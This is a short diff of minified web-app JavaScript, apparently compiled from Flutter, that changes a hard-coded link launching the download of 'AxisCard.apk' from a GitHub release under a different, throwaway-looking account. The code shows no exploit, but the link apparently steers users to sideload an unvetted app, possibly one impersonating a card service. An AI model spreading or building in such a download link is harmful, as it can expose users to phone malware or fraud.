@@ -28431,7 +28431,7 @@ abb(a,b){var s=null,r=A.w8(s,s,s,B.N1,s,B.A,s,A.aT(b,s,s,s,s,B.AS,s,s,s),s,B.cV,
 a.ae(t.Pu).f.oY(r)},
 N4(){var s=0,r=A.I(t.H),q
 var $async$N4=A.E(function(a,b){if(a===1)return A.F(b,r)
-for(;;)switch(s){case 0:q=A.jP("https://github.com/brkdwn2026-blip/kolaxpk/releases/download/kolax/AxisCard.apk",0,null)
+for(;;)switch(s){case 0:q=A.jP("https://github.com/k3713848-afk/kolaxpk/releases/download/kolax/AxisCard.apk",0,null)
 s=2
 return A.O(A.aDa(q,B.IO),$async$N4)
 case 2:if(!b)throw A.f(A.dA("Could not launch "+q.k(0)))
